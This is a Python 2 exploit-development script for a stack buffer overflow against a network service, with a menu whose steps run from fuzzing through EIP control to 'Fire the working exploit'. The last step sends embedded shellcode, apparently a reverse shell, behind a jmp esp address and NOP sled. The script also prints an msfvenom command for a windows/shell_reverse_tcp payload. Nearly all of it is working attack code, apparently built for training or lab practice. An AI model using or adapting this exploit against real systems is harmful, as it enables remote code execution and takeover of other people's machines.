#!/usr/bin/python
import socket
import os
import time, struct, sys

# Usage:
try:
    server = sys.argv[1]
    port = int(sys.argv[2])
except IndexError:
    print "[+] Usage %s IP_Address PORT" % sys.argv[0]
    sys.exit()

def totalBytes():
	buffer=["A"]
	counter=100

	while len(buffer) <= 30:
        	buffer.append("A"*counter)
        	counter=counter+200

	for string in buffer:
        	print "Fuzzing PASS with %s bytes" % len(string)
        	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        	connect=s.connect((server ,port))
        	#s.recv(1024)
        	s.send('' + string + '\r\n') #modify per PoC code
		s.recv(1024)
        	s.close()

def requiredBytes():
	buffer=int(raw_input("Enter amount of A's to send that you think crash the service: ")) * "A"
	s =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		print "\nSending Evil buffer..."
                s.connect((server ,port))
                #s.recv(1024)
                s.send('' + buffer + '\r\n') #modify per PoC code
                #s.recv(1024)
                print "\nDone!"
	except:
		print "Could not connect to Target Host"

def uniqueChars():
	num=raw_input("Enter the length of buffer required to crash: ")
	print "[!] Creating unique string using pattern_create"
	patternCreate=os.popen('/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l '+ num).read()
	print "[+] Pattern created\n" + patternCreate

	s =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
        	print "\nSending evil buffer..."
        	s.connect((server, port))
        	#data = s.recv(1024)
        	s.send('' + patternCreate + '\r\n') #modify per PoC code
        	print "\nDone!."
		print "\nCheck the EIP value and note it!"
	except:
        	print "Could not connect to Target Host"

def controlEIP():
	offset=raw_input("Enter the EIP value to get the offset: ")
	patternOffset=os.popen('/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q '+ offset).read()
	offsetNumber=int(filter(str.isdigit, patternOffset)) #filters the string 'offset at 2606' to just '2606'
	print (str(offsetNumber) + "= Offset Number")
	bufferLength=raw_input("Enter the  Length of total bytes required to crash the program: ")
	buffer2='A'*int(offsetNumber) +'B'*4 +'C'*(int(bufferLength)-int(offsetNumber)) #send 4 B's to overwrite EIP with 42424242 
	s =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
        	print "\nSending evil buffer..."
	        s.connect((server, port))
        	#data = s.recv(1024)
	        s.send('' + buffer2 + '\r\n') #modify per PoC code
        	print "\nDone!."
		print "EIP should be 42424242 (B*4)"
	except:
        	print "Could not connect to Target Host"

def baddies():
	unmodifiedList = '''
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
'''
	#Change this one to fire off and check for bad characters
	badChars=(
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

	offsetNumber=raw_input("Enter offset value i.e 2606: ")
	buffer='A'*int(offsetNumber) +'B'*4 + badChars
	s =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
                print "\nSending evil buffer..."
                s.connect((server, port))
                #data = s.recv(1024)
                s.send('' + buffer +'\r\n') #modify per PoC code
                print "\nDone!."
                print "Just sent bad characters. Check to see if any need to be removed by right clicking the ESP value, follow dump! Come back, remove from this script and run again untill all clear!"
        except:
                print "Could not connect to Target Host"

def nasmShell():
	print '''
With the executable either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified:

!mona jmp -r esp -cpb "bad_characters"

This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the "Log data" window (use the Window menu to switch to it if needed).

Choose an address that has No memory protections such as DEP and ASLR present.

Whatever the address is i.e 5F4A358F this will be reversed little endian when we get to modifying this script later.

Now create a payload: You will need to update this script with the output of this command !!
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -b "bad_characters" -f c  '''

def shellCode():
	print "Modify this script. We need the jmp ESP address"
	print "Modify this Script. We need the shellcode"
	#jmpesp examples
	'''
	jmpesp = 5F4A358F
	little endian value = '\x8f\x35\x4a\x5f'
	'''
	
	jmpesp = '\xf3\x12\x17\x31' # change this
	shellcode=("\xbb\x66\xe7\x35\xcb\xda\xcc\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x83\xc2\x04\x31\x5a\x0e\x03\x3c\xe9\xd7\x3e\x3c\x1d\x95"
"\xc1\xbc\xde\xfa\x48\x59\xef\x3a\x2e\x2a\x40\x8b\x24\x7e\x6d"
"\x60\x68\x6a\xe6\x04\xa5\x9d\x4f\xa2\x93\x90\x50\x9f\xe0\xb3"
"\xd2\xe2\x34\x13\xea\x2c\x49\x52\x2b\x50\xa0\x06\xe4\x1e\x17"
"\xb6\x81\x6b\xa4\x3d\xd9\x7a\xac\xa2\xaa\x7d\x9d\x75\xa0\x27"
"\x3d\x74\x65\x5c\x74\x6e\x6a\x59\xce\x05\x58\x15\xd1\xcf\x90"
"\xd6\x7e\x2e\x1d\x25\x7e\x77\x9a\xd6\xf5\x81\xd8\x6b\x0e\x56"
"\xa2\xb7\x9b\x4c\x04\x33\x3b\xa8\xb4\x90\xda\x3b\xba\x5d\xa8"
"\x63\xdf\x60\x7d\x18\xdb\xe9\x80\xce\x6d\xa9\xa6\xca\x36\x69"
"\xc6\x4b\x93\xdc\xf7\x8b\x7c\x80\x5d\xc0\x91\xd5\xef\x8b\xfd"
"\x1a\xc2\x33\xfe\x34\x55\x40\xcc\x9b\xcd\xce\x7c\x53\xc8\x09"
"\x82\x4e\xac\x85\x7d\x71\xcd\x8c\xb9\x25\x9d\xa6\x68\x46\x76"
"\x36\x94\x93\xd9\x66\x3a\x4c\x9a\xd6\xfa\x3c\x72\x3c\xf5\x63"
"\x62\x3f\xdf\x0b\x09\xba\x88\x39\xcc\x9d\x5c\x56\xd2\x1d\x4c"
"\xfa\x5b\xfb\x04\x12\x0a\x54\xb1\x8b\x17\x2e\x20\x53\x82\x4b"
"\x62\xdf\x21\xac\x2d\x28\x4f\xbe\xda\xd8\x1a\x9c\x4d\xe6\xb0"
"\x88\x12\x75\x5f\x48\x5c\x66\xc8\x1f\x09\x58\x01\xf5\xa7\xc3"
"\xbb\xeb\x35\x95\x84\xaf\xe1\x66\x0a\x2e\x67\xd2\x28\x20\xb1"
"\xdb\x74\x14\x6d\x8a\x22\xc2\xcb\x64\x85\xbc\x85\xdb\x4f\x28"
"\x53\x10\x50\x2e\x5c\x7d\x26\xce\xed\x28\x7f\xf1\xc2\xbc\x77"
"\x8a\x3e\x5d\x77\x41\xfb\x7d\x9a\x43\xf6\x15\x03\x06\xbb\x7b"
"\xb4\xfd\xf8\x85\x37\xf7\x80\x71\x27\x72\x84\x3e\xef\x6f\xf4"
"\x2f\x9a\x8f\xab\x50\x8f")
        offsetNumber=raw_input("Enter the offset value: ")
        buffer='A' * int(offsetNumber) + jmpesp + "\x90" * 16  + shellcode

	s =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
        	print "\nSending evil buffer..."
	        s.connect((server, port))
        	#data = s.recv(1024)
	        s.send('' + buffer + '\r\n') #modify per PoC code
        	print "\nDone!."
	except:
        	print "Could not connect to Target Host"

def menu():
        choice = raw_input('''
       	1: Fuzz A's automatically to find out how many crash the program.
        2: Confirm number of A's (Enter how many to send)
        3: Send a unique string to find out at what point we hit EIP
        4: Send correct amount to control EIP
	5: Send payload with BadCharacters (manually remove what you dont want)
	6: Get the address for jmp ESP and generate shellcode (exclude bad characters etc)
	7: Fire the working exploit
        ''')
        if choice == '1':
                totalBytes()
        elif choice == '2':
                requiredBytes()
        elif choice == '3':
                uniqueChars()
        elif choice == '4':
                controlEIP()
	elif choice == '5':
		baddies()
	elif choice == '6':
		nasmShell()
	elif choice == '7':
		shellCode()
        else:
		print "Wrong choice, qutting"
		menu()

if __name__ == "__main__":
	menu()
